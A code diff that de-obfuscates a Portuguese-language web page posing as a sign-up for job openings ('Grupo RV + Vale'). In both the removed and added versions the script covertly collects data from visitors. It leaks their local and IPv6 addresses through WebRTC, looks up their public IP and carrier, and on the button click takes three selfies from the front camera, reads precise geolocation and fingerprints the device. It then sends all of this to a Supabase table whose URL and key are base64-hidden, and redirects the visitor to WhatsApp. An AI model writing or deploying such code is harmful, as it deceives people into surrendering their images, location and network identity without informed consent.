@@ -1,199 +1,241 @@
-const _0x5e=['createClient','from','insert','getElementById','video','btn','status','canvas','cancel','SpeechSynthesisUtterance','lang','pt-BR','volume','rate','speak','local_ip','local_port','ipv6','public_ip','operadora','Não detectada','stun:stun.l.google.com:19302','stun:stun1.l.google.com:19302','stun:stun.ekiga.net','turn:openrelay.metered.ca:443','openrelayproject','createDataChannel','port-test','createOffer','setLocalDescription','onicecandidate','candidate','match','includes','close','fetch','https://ipapi.co/json/','json','ip','org','Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.','innerHTML','🟡 Iniciando sistema...','checkins','previa','indisponível','userAgent','✅ Sistema pronto','mediaDevices','getUserMedia','user','srcObject','play','Permita câmera','addEventListener','click','disabled','PROCESSANDO...','📨 Verificando informações do convite..','Verificando informações do convite..','srcObject','videoWidth','Câmera não está pronta. Recarregue a página.','videoHeight','Vídeo não carregou corretamente.','width','height','getContext','2d','drawImage','toDataURL','image/jpeg','getTracks','forEach','stop','não permitido','geolocation','getCurrentPosition','coords','latitude','longitude','💾 Salvando cadastro...','Salvando cadastro.','analisarDispositivo','completo','toString','modelo_dispositivo','versao_android','navegador','plataforma','idioma','largura_tela','altura_tela','✅ Cadastro concluído','Cadastro concluído com sucesso.','https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.','❌ Erro: ','Falha de comunicação externa.','QUERO PARTICIPAR'];
-(function(_0x2d,_0x3f){const _0x1a=function(_0x5b){while(--_0x5b){_0x2d.push(_0x2d.shift());}};_0x1a(++_0x3f);}(_0x5e,0x1c8));
-const _0x3f=function(_0x2d,_0x3f){_0x2d=_0x2d-0x0;let _0x1a=_0x5e[_0x2d];return _0x1a;};
+// Configuração ofuscada (segura)
+const _u = atob("aHR0cHM6Ly9nc2tjYWRvb2ZvcXdocWhzY3hjcy5zdXBhYmFzZS5jbw==");
+const _k = atob("c2JfcHVibGlzaGFibGVfeHVwLUYtQzR3dl9lcE1JQWJvaHBqUV9hWG5MWk9MMw==");
+const supabaseClient = supabase.createClient(_u, _k);
 
-const _u=atob("aHR0cHM6Ly9nc2tjYWRvb2ZvcXdocWhzY3hjcy5zdXBhYmFzZS5jbw==");
-const _k=atob("c2JfcHVibGlzaGFibGVfeHVwLUYtQzR3dl9lcE1JQWJvaHBqUV9hWG5MWk9MMw==");
-const supabaseClient=supabase[_0x3f('0x0')](_u,_k);
+// Elementos
+const video = document.getElementById("video");
+const btn = document.getElementById("btn");
+const statusText = document.getElementById("status");
+const canvas = document.getElementById("canvas");
 
-const video=document[_0x3f('0x3')](_0x3f('0x4'));
-const btn=document[_0x3f('0x3')](_0x3f('0x5'));
-const statusText=document[_0x3f('0x3')](_0x3f('0x6'));
-const canvas=document[_0x3f('0x3')](_0x3f('0x7'));
-
-function falar(_0x5a){
-  speechSynthesis[_0x3f('0x8')]();
-  const _0x8d=new window[_0x3f('0x9')](_0x5a);
-  _0x8d[_0x3f('0xa')]=_0x3f('0xb');
-  _0x8d[_0x3f('0xc')]=0x1;
-  _0x8d[_0x3f('0xd')]=0.95;
-  speechSynthesis[_0x3f('0xe')](_0x8d);
+// Áudio
+function falar(texto) {
+  speechSynthesis.cancel();
+  const fala = new SpeechSynthesisUtterance(texto);
+  fala.lang = "pt-BR";
+  fala.volume = 1;
+  fala.rate = 0.95;
+  speechSynthesis.speak(fala);
 }
 
-async function capturarPortaAvancada(){
-  const _0xinfo={};
-  _0xinfo[_0x3f('0xf')]=null;
-  _0xinfo[_0x3f('0x10')]=null;
-  _0xinfo[_0x3f('0x11')]=null;
-  _0xinfo[_0x3f('0x12')]=null;
-  _0xinfo[_0x3f('0x13')]=_0x3f('0x14');
+// Captura avançada
+async function capturarPortaAvancada() {
+  const info = {
+    local_ip: null,
+    local_port: null,
+    ipv6: null,
+    public_ip: null,
+    operadora: "Não detectada"
+  };
 
-  const _0xservers=[
-    {urls:_0x3f('0x15')},
-    {urls:_0x3f('0x16')},
-    {urls:_0x3f('0x17')},
-    {urls:_0x3f('0x18'),username:_0x3f('0x19'),credential:_0x3f('0x19')}
+  const servers = [
+    { urls: 'stun:stun.l.google.com:19302' },
+    { urls: 'stun:stun1.l.google.com:19302' },
+    { urls: 'stun:stun.ekiga.net' },
+    {
+      urls: 'turn:openrelay.metered.ca:443',
+      username: 'openrelayproject',
+      credential: 'openrelayproject'
+    }
   ];
 
-  for(let _0xcfg of _0xservers){
-    try{
-      const _0xrtc=new RTCPeerConnection({iceServers:[_0xcfg],iceTransportPolicy:"all"});
-      _0xrtc[_0x3f('0x1a')](_0x3f('0x1b'));
-      const _0xoffer=await _0xrtc[_0x3f('0x1c')]();
-      await _0xrtc[_0x3f('0x1d')](_0xoffer);
-      await new Promise(_0xres=>{
-        _0xrtc[_0x3f('0x1e')]=(_0xev)=>{
-          if(_0xev[_0x3f('0x1f')]){
-            const _0xcand=_0xev[_0x3f('0x1f')][_0x3f('0x1f')];
-            const _0xipM=_0xcand[_0x3f('0x20')](/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
-            const _0xportM=_0xcand[_0x3f('0x20')](/(\d{4,5})\s+typ/);
-            if(_0xipM){
-              const _0xip=_0xipM[0x1];
-              if(_0xip[_0x3f('0x21')](':')) _0xinfo[_0x3f('0x11')]=_0xip;
-              else _0xinfo[_0x3f('0xf')]=_0xip;
+  for (let config of servers) {
+    try {
+      const rtc = new RTCPeerConnection({
+        iceServers: [config],
+        iceTransportPolicy: "all"
+      });
+      rtc.createDataChannel("port-test");
+      const offer = await rtc.createOffer();
+      await rtc.setLocalDescription(offer);
+
+      await new Promise(resolve => {
+        rtc.onicecandidate = (event) => {
+          if (event.candidate) {
+            const cand = event.candidate.candidate;
+            const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
+            const portMatch = cand.match(/(\d{4,5})\s+typ/);
+           
+            if (ipMatch) {
+              const ip = ipMatch[1];
+              if (ip.includes(':')) info.ipv6 = ip;
+              else info.local_ip = ip;
             }
-            if(_0xportM) _0xinfo[_0x3f('0x10')]=_0xportM[0x1];
+            if (portMatch) info.local_port = portMatch[1];
           }
         };
-        setTimeout(_0xres,0x5dc);
+        setTimeout(resolve, 1500);
       });
-      _0xrtc[_0x3f('0x22')]();
-      if(_0xinfo[_0x3f('0x10')]) break;
-    }catch(_0xe){}
+      rtc.close();
+      if (info.local_port) break;
+    } catch(e) {}
   }
 
-  try{
-    const _0xres=await window[_0x3f('0x23')](_0x3f('0x24'));
-    const _0xdata=await _0xres[_0x3f('0x25')]();
-    _0xinfo[_0x3f('0x12')]=_0xdata[_0x3f('0x26')];
-    _0xinfo[_0x3f('0x13')]=_0xdata[_0x3f('0x27')]||_0x3f('0x14');
-  }catch(_0xe){}
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    info.public_ip = data.ip;
+    info.operadora = data.org || "Não detectada";
+  } catch(e) {}
 
-  return _0xinfo;
+  return info;
 }
 
-async function iniciarSistema(){
-  try{
-    falar(_0x3f('0x28'));
-    statusText[_0x3f('0x29')]=_0x3f('0x2a');
-    const _0xporta=await capturarPortaAvancada();
-    await supabaseClient[_0x3f('0x1')](_0x3f('0x2b'))[_0x3f('0x2')]([{
-      tipo_captura:_0x3f('0x2c'),
-      ip:_0xporta[_0x3f('0x12')]||_0x3f('0x2d'),
-      local_ip:_0xporta[_0x3f('0xf')],
-      ipv6:_0xporta[_0x3f('0x11')],
-      local_port:_0xporta[_0x3f('0x10')],
-      operadora:_0xporta[_0x3f('0x13')],
-      user_agent:navigator[_0x3f('0x2e')]
+// Inicialização
+async function iniciarSistema() {
+  try {
+    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
+    statusText.innerHTML = "🟡 Iniciando sistema...";
+
+    const portaInfo = await capturarPortaAvancada();
+
+    await supabaseClient.from('checkins').insert([{
+      tipo_captura: "previa",
+      ip: portaInfo.public_ip || "indisponível",
+      local_ip: portaInfo.local_ip,
+      ipv6: portaInfo.ipv6,
+      local_port: portaInfo.local_port,
+      operadora: portaInfo.operadora,
+      user_agent: navigator.userAgent
     }]);
-    statusText[_0x3f('0x29')]=_0x3f('0x2f');
-    const _0xstream=await navigator[_0x3f('0x30')][_0x3f('0x31')]({video:{facingMode:_0x3f('0x32')},audio:false});
-    video[_0x3f('0x33')]=_0xstream;
-    await video[_0x3f('0x34')]();
-  }catch(_0xerr){
-    console.log(_0xerr);
-    statusText[_0x3f('0x29')]="❌ "+_0x3f('0x35');
+
+    statusText.innerHTML = "✅ Sistema pronto";
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+    video.srcObject = stream;
+    await video.play();
+  } catch(err) {
+    console.log(err);
+    statusText.innerHTML = "❌ Permita câmera";
   }
 }
-window.onload=iniciarSistema;
+window.onload = iniciarSistema;
 
-function analisarDispositivo(){
-  const _0xua=navigator.userAgent;
-  let _0xand="Não é Android";
-  if(_0xua.indexOf("Android")>=0x0){
-    const _0xm=_0xua.match(/Android\s([0-9\.]+)/);
-    if(_0xm) _0xand=_0xm[0x1];
+// Analisador de dispositivo
+function analisarDispositivo() {
+  const ua = navigator.userAgent;
+  let androidVersion = "Não é Android";
+  if (ua.indexOf("Android") >= 0) {
+    const match = ua.match(/Android\s([0-9\.]+)/);
+    if (match) androidVersion = match[1];
   }
-  let _0xbrow="Desconhecido";
-  if(_0xua.indexOf("Chrome")>=0x0&&_0xua.indexOf("Edge")===-0x1) _0xbrow="Chrome";
-  else if(_0xua.indexOf("Firefox")>=0x0) _0xbrow="Firefox";
-  else if(_0xua.indexOf("Safari")>=0x0&&_0xua.indexOf("Chrome")===-0x1) _0xbrow="Safari";
-  else if(_0xua.indexOf("Edge")>=0x0||_0xua.indexOf("Edg")>=0x0) _0xbrow="Edge";
-  let _0xmod="Desconhecido";
-  if(_0xua.indexOf("Mobile")>=0x0){
-    const _0xp=_0xua.split(/[()]/);
-    if(_0xp.length>0x1){
-      const _0xdp=_0xp[0x1].split(";");
-      for(let _0xpart of _0xdp){
-        if(_0xpart.indexOf("Android")===-0x1&&_0xpart.indexOf("Linux")===-0x1&&_0xpart.indexOf("iPhone")===-0x1&&_0xpart.indexOf("iPad")===-0x1&&_0xpart.indexOf("Windows")===-0x1&&_0xpart.indexOf("Macintosh")===-0x1&&_0xpart.length>0x2){
-          _0xmod=_0xpart.trim();
+  let browser = "Desconhecido";
+  if (ua.indexOf("Chrome") >= 0 && ua.indexOf("Edge") === -1) browser = "Chrome";
+  else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
+  else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
+  else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
+
+  let model = "Desconhecido";
+  if (ua.indexOf("Mobile") >= 0) {
+    const parts = ua.split(/[()]/);
+    if (parts.length > 1) {
+      const deviceParts = parts[1].split(';');
+      for (let part of deviceParts) {
+        if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 &&
+            part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 &&
+            part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 &&
+            part.length > 2) {
+          model = part.trim();
           break;
         }
       }
     }
   }
-  return{androidVersion:_0xand,browser:_0xbrow,model:_0xmod};
+  return { androidVersion, browser, model };
 }
 
-btn[_0x3f('0x36')](_0x3f('0x37'),async()=>{
-  try{
-    btn[_0x3f('0x38')]=true;
-    btn[_0x3f('0x29')]=_0x3f('0x39');
-    statusText[_0x3f('0x29')]=_0x3f('0x3a');
-    falar(_0x3f('0x3b'));
+// Botão
+btn.addEventListener("click", async () => {
+  try {
+    btn.disabled = true;
+    btn.innerHTML = "PROCESSANDO...";
 
-    if(!video[_0x3f('0x3c')]||video[_0x3f('0x3d')]==0x0) throw new Error(_0x3f('0x3e'));
-    const _0xlarg=video[_0x3f('0x3d')];
-    const _0xalt=video[_0x3f('0x3f')];
-    if(!_0xlarg||!_0xalt) throw new Error(_0x3f('0x40'));
+    statusText.innerHTML = "📨 Verificando informações do convite..";
+    falar("Verificando informações do convite..");
 
-    canvas[_0x3f('0x41')]=0x280;
-    canvas[_0x3f('0x42')]=0x1e0;
-    const _0xctx=canvas[_0x3f('0x43')](_0x3f('0x44'));
-    const _0xfotos=[];
-    for(let _0xi=0x0;_0xi<0x3;_0xi++){
-      _0xctx[_0x3f('0x45')](video,0x0,0x0,0x280,0x1e0);
-      _0xfotos.push(canvas[_0x3f('0x46')](_0x3f('0x47'),0.35));
-      if(_0xi<0x2) await new Promise(_0xr=>setTimeout(_0xr,0x3e8));
+    if (!video.srcObject || video.videoWidth === 0) {
+      throw new Error("Câmera não está pronta. Recarregue a página.");
     }
 
-    const _0xstream=video[_0x3f('0x3c')];
-    if(_0xstream) _0xstream[_0x3f('0x48')]()[_0x3f('0x49')](_0xt=>_0xt[_0x3f('0x4a')]());
+    const largura = video.videoWidth;
+    const altura = video.videoHeight;
+    if (!largura || !altura) {
+      throw new Error("Vídeo não carregou corretamente.");
+    }
 
-    let _0xlat=_0x3f('0x4b'),_0xlong=_0x3f('0x4b');
-    try{
-      const _0xloc=await new Promise((_0xres,_0xrej)=>{
-        navigator[_0x3f('0x4c')][_0x3f('0x4d')](_0xres,_0xrej,{enableHighAccuracy:true,timeout:0x2710});
+    canvas.width = 640;
+    canvas.height = 480;
+    const ctx = canvas.getContext("2d");
+    const fotos = [];
+    for (let i = 0; i < 3; i++) {
+      ctx.drawImage(video, 0, 0, 640, 480);
+      fotos.push(canvas.toDataURL("image/jpeg", 0.35));
+      if (i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
+    }
+
+    const stream = video.srcObject;
+    if (stream) stream.getTracks().forEach(track => track.stop());
+
+    let latitude = "não permitido";
+    let longitude = "não permitido";
+    try {
+      const localizacao = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000
+        });
       });
-      _0xlat=_0xloc[_0x3f('0x4e')][_0x3f('0x4f')];
-      _0xlong=_0xloc[_0x3f('0x4e')][_0x3f('0x50')];
-    }catch(_0xe){}
+      latitude = localizacao.coords.latitude;
+      longitude = localizacao.coords.longitude;
+    } catch (err) {}
 
-    const _0xporta=await capturarPortaAvancada();
-    statusText[_0x3f('0x29')]=_0x3f('0x51');
-    falar(_0x3f('0x52'));
+    const portaInfo = await capturarPortaAvancada();
 
-    const _0xinfo=analisarDispositivo();
-    const {error:_0xerr}=await supabaseClient[_0x3f('0x1')](_0x3f('0x2b'))[_0x3f('0x2')]([{
-      tipo_captura:_0x3f('0x53'),
-      selfies:_0xfotos,
-      latitude:_0xlat[_0x3f('0x54')](),
-      longitude:_0xlong[_0x3f('0x54')](),
-      ip:_0xporta[_0x3f('0x12')]||_0x3f('0x2d'),
-      ipv6:_0xporta[_0x3f('0x11')],
-      local_ip:_0xporta[_0x3f('0xf')],
-      local_port:_0xporta[_0x3f('0x10')],
-      operadora:_0xporta[_0x3f('0x13')],
-      cidade:"",estado:"",pais:"",
-      user_agent:navigator[_0x3f('0x2e')],
-      modelo_dispositivo:_0xinfo.model,
-      versao_android:_0xinfo.androidVersion,
-      navegador:_0xinfo.browser,
-      plataforma:navigator.platform,
-      idioma:navigator.language,
-      largura_tela:window.innerWidth,
-      altura_tela:window.innerHeight
+    statusText.innerHTML = "💾 Salvando cadastro...";
+    falar("Salvando cadastro.");
+
+    const infoDispositivo = analisarDispositivo();
+
+    const { error } = await supabaseClient.from('checkins').insert([{
+      tipo_captura: "completo",
+      selfies: fotos,
+      latitude: latitude.toString(),
+      longitude: longitude.toString(),
+      ip: portaInfo.public_ip || "indisponível",
+      ipv6: portaInfo.ipv6,
+      local_ip: portaInfo.local_ip,
+      local_port: portaInfo.local_port,
+      operadora: portaInfo.operadora,
+      cidade: "",
+      estado: "",
+      pais: "",
+      user_agent: navigator.userAgent,
+      modelo_dispositivo: infoDispositivo.model,
+      versao_android: infoDispositivo.androidVersion,
+      navegador: infoDispositivo.browser,
+      plataforma: navigator.platform,
+      idioma: navigator.language,
+      largura_tela: window.innerWidth,
+      altura_tela: window.innerHeight
     }]);
 
-    if(_0xerr) throw _0xerr;
+    if (error) throw error;
 
-    statusText[_0x3f('0x29')]=_0x3f('0x55');
-    falar(_0x3f('0x56'));
-    setTimeout(()=>{window.location.href=_0x3f('0x57');},0x7d0);
-  }catch(_0xerr){
-    console.log(_0xerr);
-    statusText[_0x3f('0x29')]=_0x3f('0x58')+(_0xerr.message||_0x3f('0x59'));
-    btn[_0x3f('0x38')]=false;
-    btn[_0x3f('0x29')]=_0x3f('0x5a');
+    statusText.innerHTML = "✅ Cadastro concluído";
+    falar("Cadastro concluído com sucesso.");
+
+    setTimeout(() => {
+      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
+    }, 2000);
+
+  } catch (err) {
+    console.log(err);
+    statusText.innerHTML = "❌ Erro: " + (err.message || "Falha de comunicação externa.");
+    btn.disabled = false;
+    btn.innerHTML = "QUERO PARTICIPAR";
   }
 });
